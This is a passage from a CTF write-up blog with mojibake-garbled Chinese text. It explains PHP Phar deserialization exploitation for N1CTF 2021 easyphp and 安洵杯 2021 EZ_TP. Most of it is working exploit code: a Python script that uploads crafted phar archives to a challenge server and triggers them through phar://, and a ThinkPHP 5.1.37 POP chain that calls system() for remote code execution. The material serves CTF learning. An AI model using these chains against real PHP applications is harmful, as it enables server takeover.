class=\"comment\">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æŠŠè¿™ä¸ªè·‘åœ¨æœ¬åœ°webæœåŠ¡ä¸Šï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼ˆå½“æ—¶åŠå¤œèµ¶åˆ¶çš„å¾ˆä¸‘ä¼šç•™ä¸‹ä¸€äº›åƒåœ¾æ–‡ä»¶ æ±‚è½»å–· é˜Ÿé‡Œå¸ˆå‚…å†™çš„å¹²å‡€å¤šäº†ï¼‰ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> rq</span><br><span class=\"line\"><span class=\"keyword\">import</span> json </span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\">ip = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_random_str</span>(<span class=\"params\">randomlength=<span class=\"number\">16</span></span>):</span><br><span class=\"line\">  <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">  ç”Ÿæˆä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²</span></span><br><span class=\"line\"><span class=\"string\">  &quot;&quot;&quot;</span></span><br><span class=\"line\">  random_str = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  base_str = <span class=\"string\">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\">  length = <span class=\"built_in\">len</span>(base_str) - <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(randomlength):</span><br><span class=\"line\">    random_str += base_str[random.randint(<span class=\"number\">0</span>, length)]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> random_str</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_one</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    rd = generate_random_str(<span class=\"number\">4</span>)</span><br><span class=\"line\">    ts2 = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class=\"line\">    ts = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class=\"line\">    res = rq.get(url=<span class=\"string\">f&quot;http://127.0.0.1/test.php?sb=<span class=\"subst\">&#123;rd&#125;</span>&amp;ts=<span class=\"subst\">&#123;ts2&#125;</span>&quot;</span>)  <span class=\"comment\"># è®¿é—®æœ¬åœ°ç”Ÿæˆphar</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f: </span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    data = data[<span class=\"number\">70</span>::]<span class=\"comment\">#å»æ‰å‰é¢çš„å†—ä½™éƒ¨åˆ†ä»¥ä¾¿å’Œlogå‰é¢æ‹¼æ¥å½¢æˆåˆæ³•*.phar.tar</span></span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;content-type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form&#x27;</span>&#125;  <span class=\"comment\"># æºæ–‡æœ¬</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class=\"subst\">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class=\"comment\"># å†™å…¥æ—¥å¿—</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class=\"subst\">&#123;ip&#125;</span>/<span class=\"subst\">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class=\"comment\"># ååºåˆ—åŒ–</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(res.text)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">30</span>,<span class=\"number\">30</span>):<span class=\"comment\">#è€ƒè™‘æœ¬åœ°å’Œè¿œç¨‹çš„æ—¶é—´å·®å¼‚ï¼Œè¿™è¾¹è®¾ç½®ä¸ª30sçš„çª—å£æœŸ</span></span><br><span class=\"line\">    new_one(i)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.9</span>)</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;ç”Ÿæˆçš„æ–‡ä»¶é•¿è¿™æ ·ï¼ˆçœ‹ä¸ªå¼€å¤´å°±è¡Œï¼‰</span></span><br><span class=\"line\"><span class=\"string\">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class=\"line\"><span class=\"string\">00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class=\"line\"><span class=\"string\">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class=\"line\"><span class=\"string\">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class=\"line\"><span class=\"string\">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class=\"line\"><span class=\"string\">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class=\"line\"><span class=\"string\">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class=\"line\"><span class=\"string\">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class=\"line\"><span class=\"string\">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>ä¸åªæ˜¯tarï¼Œè¿˜æœ‰åˆ«çš„æ ¼å¼ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png\" loading=\"lazy\"><br><a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>å¯¹åº”çš„ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">BZ2</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.tar.bz2</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">GZ</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.tar.gz</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">ZIP</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.zip</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"POPé“¾\"><a href=\"#POPé“¾\" class=\"headerlink\" title=\"POPé“¾\"></a><strong>POPé“¾</strong></h3><p>POP(property oriented programming)ï¼Œè¯´ç™½äº†å°±æ˜¯ç»è¿‡ä¸€è¿ä¸²çš„é­”æœ¯æ–¹æ³•&#x2F;ç‰¹æ®Šæ–¹æ³•è°ƒç”¨è¾¾åˆ°ç‰¹å®šç›®çš„çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡åœ¨è°ƒç”¨è¿™äº›æ–¹æ³•çš„è¿‡ç¨‹ä¸­åˆè§¦å‘äº†åˆ«çš„ç‰¹æ®Šæ–¹æ³•ï¼Œå¼•å‘è¿é”ååº”ç›´åˆ°è§¦åŠç›®æ ‡ã€‚pharååºåˆ—åŒ–ä½¿å¾—ä¸å­˜åœ¨unserilizeå‡½æ•°æ—¶è¿™æ ·çš„æ”»å‡»ä¹Ÿèƒ½æˆåŠŸï¼Œè¿™æ­£æ˜¯æ‰€è°“â€œæ‰©å¤§æ”»å‡»é¢â€ã€‚æˆ‘ä»¬ä»¥åˆšåˆšç»“æŸçš„å®‰æ´µæ¯2021 EZ_TPä¸ºä¾‹å­ã€‚</p>\n<p>ç½‘ç«™ä½¿ç”¨ThinkPHP V5.1.37ï¼Œç½‘ä¸Šå·²æœ‰ç°æˆçš„<a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">POPé“¾</a>ï¼Œç°åœ¨éœ€è¦æˆ‘ä»¬åœ¨æ²¡æœ‰unserilizeå‡½æ•°çš„æƒ…å†µä¸‹å®Œæˆååºåˆ—åŒ–æ”»å‡»ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">app</span>\\<span class=\"title class_\">index</span>\\<span class=\"title class_\">controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">controller</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        <span class=\"variable\">$hello</span> = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;hello&#x27;</span>])||<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hello&#x27;</span>])) <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>],<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$a</span> = <span class=\"string\">&#x27;hello.txt&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$hello</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&#x27;hello.txt&#x27;</span>, <span class=\"variable\">$s</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>parse_str()å’Œextract()ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–å®Œæˆæ–‡ä»¶å†™å…¥ä¸ä»»æ„è¯»å–ï¼Œå¹¶ä¸”$aå¯ä»¥ä½¿ç”¨ä¼ªåè®®ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç†æ‰€åº”å½“äº†ï¼šå¾€hello.txté‡Œå†™å…¥ä¸€ä¸ªpharï¼Œmetadataé‡Œé¢æ”¾ThinkPHP 5.1.37 çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå®ŒæˆRCE.(å…³äºè¿™ä¸ªPOPé“¾çš„åŸç†è¯·å‚é˜…<a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-ååºåˆ—åŒ–æ¼æ´/Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´.html</a> è®²çš„å¾ˆè¯¦ç»†)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">append</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;append = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;[<span class=\"string\">&quot;godspeedyyds&quot;</span>,<span class=\"string\">&quot;xtxyyds&quot;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;<span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Request</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$hook</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$filter</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = [</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_method&#x27;</span>       =&gt; <span class=\"string\">&#x27;_method&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_ajax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_ajax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pjax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_pjax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class=\"string\">&#x27;s&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class=\"line\">                <span class=\"string\">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_URL&#x27;</span></span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"string\">&#x27;default_filter&#x27;</span>   =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_domain_root&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;https_agent_name&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class=\"string\">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class=\"string\">&#x27;html&#x27;</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$param</span> = [<span class=\"string\">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;filter = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;config = [<span class=\"string\">&quot;var_ajax&quot;</span>=&gt;<span class=\"string\">&#x27;&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;hook = [<span class=\"string\">&quot;visible&quot;</span>=&gt;[<span class=\"variable language_\">$this</span>,<span class=\"string\">&quot;isAjax&quot;</span>]];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">concern</span>\\<span class=\"title class_\">Conversion</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">Pivot</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Windows</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$files</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;files = [<span class=\"keyword\">new</span> <span class=\"title class_\">Pivot</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>\\<span class=\"title class_\">Windows</span>;</span><br><span class=\"line\">    <span class=\"variable\">$w</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Windows</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$p</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$w</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;12345&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ‰§è¡Œåç”Ÿæˆpharï¼Œç„¶åæ‰§è¡Œè„šæœ¬</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    s = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class=\"line\"><span class=\"comment\"># 